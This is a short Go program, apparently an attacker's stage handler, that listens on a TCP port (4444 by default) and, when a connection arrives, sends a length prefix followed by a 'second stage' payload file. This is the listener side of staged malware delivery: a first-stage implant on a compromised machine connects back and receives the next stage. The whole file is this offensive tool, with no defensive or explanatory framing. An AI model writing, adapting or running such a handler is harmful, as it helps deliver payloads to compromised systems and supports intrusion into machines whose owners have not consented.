package main


import "github.com/fatih/color"
import "encoding/binary"
import "io/ioutil"
import "strconv"
import "net"
import "fmt"
import "os"



var Red *color.Color = color.New(color.FgRed)
var BoldRed *color.Color = Red.Add(color.Bold)
var	Blue *color.Color = color.New(color.FgBlue)
var	BoldBlue *color.Color = Blue.Add(color.Bold)
var	Yellow *color.Color = color.New(color.FgYellow)
var	BoldYellow *color.Color = Yellow.Add(color.Bold)
var	Green *color.Color = color.New(color.FgGreen)
var	BoldGreen *color.Color = Green.Add(color.Bold)


const VERSION string = "1.0.0"


func main() {

	var PORT string = "4444"

 	ARGS := os.Args[1:]
  	if len(ARGS) == 0 || ARGS[0] == "--help" || ARGS[0] == "-h"{
    	Help()
    	os.Exit(0)
  	}

  	tmp, err := strconv.Atoi(ARGS[1])
  	if err != nil || tmp < 0 || tmp > 65535{
  		BoldRed.Println("\n[!] ERROR: Invalid port number.")
  		os.Exit(1)  		
  	}

  	PORT = ARGS[1]

  	File, Err := ioutil.ReadFile(ARGS[0])
  	if Err != nil {
  		BoldRed.Println("\n[!] ERROR: Can't open the file :(")
  		os.Exit(1)
  	}

  	stageSize := make([]byte, 4)
    binary.LittleEndian.PutUint32(stageSize, uint32(len(File)))

  	sock, sockErr := net.Listen("tcp", ":"+PORT)
  	if sockErr != nil {
        BoldRed.Println("\n[!] ERROR: Invalid port number.\n")
       	fmt.Println(sockErr)
       	os.Exit(1) 			
  	}
  	BoldBlue.Print("[*] ")
  	fmt.Print("Listening on port ",PORT,"\n")

  	conn, connErr := sock.Accept()
  	if connErr != nil {
        BoldRed.Println("\n[!] ERROR: Connection error.\n")
       	fmt.Println(connErr)
       	os.Exit(1) 			
  	}
  	BoldGreen.Print("[*] ")
  	fmt.Print("Sending second stage (",len(File),") byte\n")  	
  	conn.Write([]byte(stageSize))
  	conn.Write(File)

  	BoldGreen.Println("\n[+] Stage send !")
}

  
	
func Help() {
   var Help string = `
USAGE: handler file.stage port

`
  color.Green(Help)

}